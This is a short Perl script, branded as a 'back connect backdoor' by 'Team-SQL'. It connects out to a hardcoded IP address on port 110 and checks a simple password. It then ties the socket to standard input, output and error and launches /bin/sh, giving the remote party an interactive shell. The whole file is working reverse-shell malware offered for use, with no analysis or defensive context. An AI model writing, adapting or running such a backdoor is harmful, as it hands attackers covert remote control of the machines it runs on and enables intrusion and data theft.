#! /usr/bin/perl
use IO::Socket::INET;
$host = "94.249.82.64";
$port = 110;
$pass = "SQL";
$logo = "===::: Perl back connect backdoor:::===\n".
"           web: www.Team-SQL \n";
*SOCK = IO::Socket::INET->new(
PeerAddr => $host,
PeerPort => $port,
Proto    => 'tcp',
Type     => SOCK_STREAM,
) or die("Failed!\n");
print "Connected to $host:$port...\n";
print SOCK $logo;
print SOCK "Password: ";
$cp = <SOCK>; $cp =~ s/\n//; $cp =~ s/\r//;
if($cp eq $pass)
{
print SOCK "Welcome!\n";
open STDIN,  "<&SOCK";
open STDOUT, ">&SOCK";
open STDERR, ">&SOCK";
system("/bin/sh");
}
print SOCK "Bye!\n";
close SOCK;